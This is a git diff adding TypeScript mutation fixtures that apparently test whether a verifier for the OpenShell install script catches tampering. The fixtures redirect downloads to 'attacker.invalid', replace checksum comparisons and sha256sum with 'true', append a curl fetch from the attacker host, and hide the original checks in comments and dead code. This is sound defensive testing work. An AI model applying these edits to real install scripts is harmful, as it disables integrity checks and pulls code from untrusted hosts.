@@ -6,6 +6,82 @@ import fs from "node:fs";
 import path from "node:path";
 import { v00116Pins, v012Pins } from "./openshell-release-fixtures";
 
+export function brevMutationFixtures(
+  ASSET_DIGESTS: ReadonlyMap<string, string>,
+  ASSETS: readonly string[],
+  OFFICIAL_UNEXPECTED_BREV_ASSET: string,
+  OFFICIAL_UNEXPECTED_BREV_DIGEST: string,
+): Partial<Record<FixtureMode, (source: string) => string>> {
+  const corruptFirstBrevPin = (source: string): string =>
+    source.replace(ASSET_DIGESTS.get(ASSETS[0]) ?? "missing", "0".repeat(64));
+  return {
+    "brev-bypassed-comparison": (source) =>
+      source.replace('[[ "$release_sha" == "$expected_sha" ]]', "true"),
+    "brev-changed-asset": (source) =>
+      source.replace(
+        'openshell-x86_64-unknown-linux-musl.tar.gz" ;;',
+        'openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz" ;;',
+      ),
+    "brev-changed-extraction-target": (source) =>
+      source.replace(
+        'tar xzf "$tmpdir/$asset" -C "$tmpdir"',
+        'tar xzf "$tmpdir/$asset" -C /usr/local/bin',
+      ),
+    "brev-changed-url": (source) =>
+      source.replace(
+        "https://github.com/NVIDIA/OpenShell/releases/download/${OPENSHELL_VERSION}/${asset}",
+        "https://attacker.invalid/openshell/${OPENSHELL_VERSION}/${asset}",
+      ),
+    "brev-comment-decoy": (source) => {
+      const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
+      const comparison = '[[ "$release_sha" == "$expected_sha" ]]';
+      return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
+    },
+    "brev-dead-code-decoy": (source) => {
+      const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
+      return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"')}\nif false; then\n  ${lookup}\nfi\n`;
+    },
+    "brev-decoy-table": (source) =>
+      source.replace(
+        'openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
+        'attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
+      ),
+    "brev-bypassed-verifier-call": (source) =>
+      source.replace('verify_openshell_cli_asset "$tmpdir" "$asset"', ":"),
+    "brev-extra-download": (source) => `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
+    "brev-indirect-selector-override": (source) =>
+      `${source}\nselector=OPENSHELL_VERSION\ndeclare "$selector=v9.9.9"\n`,
+    "brev-later-selector-override": (source) => `${source}\nOPENSHELL_VERSION="v9.9.9"\n`,
+    "brev-literalized-pin-selector": (source) =>
+      source.replace('case "${release_tag}:${asset}" in', "case '${release_tag}:${asset}' in"),
+    "brev-mismatch": corruptFirstBrevPin,
+    "brev-sha-command-bypass": (source) => source.replace("sha_cmd=(sha256sum)", "sha_cmd=(true)"),
+    "duplicate-brev-pin": (source) => {
+      const pinLine = `      printf '%s\\n' "${ASSET_DIGESTS.get(ASSETS[0])}"`;
+      return source.replace(pinLine, `${pinLine}\n${pinLine}`);
+    },
+    "missing-brev-pin": (source) =>
+      source.replace(ASSET_DIGESTS.get(ASSETS[1]) ?? "missing", "missing"),
+    "mismatched-table-versions": (source) => source.replaceAll("v0.0.116:", "v0.0.117:"),
+    "official-but-unexpected-brev-asset": (source) =>
+      source
+        .replace(`v0.0.116:${ASSETS[1]})`, `v0.0.116:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
+        .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
+    "pr-checker-bypass": corruptFirstBrevPin,
+    "pr-parser-bypass": corruptFirstBrevPin,
+    "brev-stable-version-drift": (source) =>
+      source.replace(
+        'stable | auto) OPENSHELL_VERSION="v0.0.116" ;;',
+        'stable | auto) OPENSHELL_VERSION="v0.0.117" ;;',
+      ),
+    "runtime-consumers-newer-than-tables": (source) =>
+      source.replace(
+        'stable | auto) OPENSHELL_VERSION="v0.0.116" ;;',
+        'stable | auto) OPENSHELL_VERSION="v0.0.117" ;;',
+      ),
+  };
+}
+
 const MACOS_METHOD_START = `MACOS_INSTALL_METHOD="\${_NEMOCLAW_OPENSHELL_INSTALL_METHOD:-auto}"`;
 const MACOS_METHOD_END = "esac\n";
 
@@ -108,6 +184,23 @@ export function prepareReleaseFixtureRuntime(repoRoot: string, root: string): vo
     candidatePins.trim(),
   );
   fs.writeFileSync(path.join(root, runtimePath), prepared);
+}
+
+export function alterRequiredReleaseValue(
+  root: string,
+  name: string,
+  value: string,
+  label: string,
+): void {
+  const file = path.join(root, name);
+  const before = fs.readFileSync(file, "utf8");
+  if (!before.includes(value)) {
+    throw new Error(`Mutation fixture lacks the expected ${label} input`);
+  }
+  const replacement = value.startsWith("https:")
+    ? "https://attacker.invalid/"
+    : (value.startsWith("sha256:") ? "sha256:" : "") + "0".repeat(64);
+  fs.writeFileSync(file, before.replace(value, replacement));
 }
 
 export function preparedReleaseArgs(repoRoot: string, root: string, format = "json"): string[] {
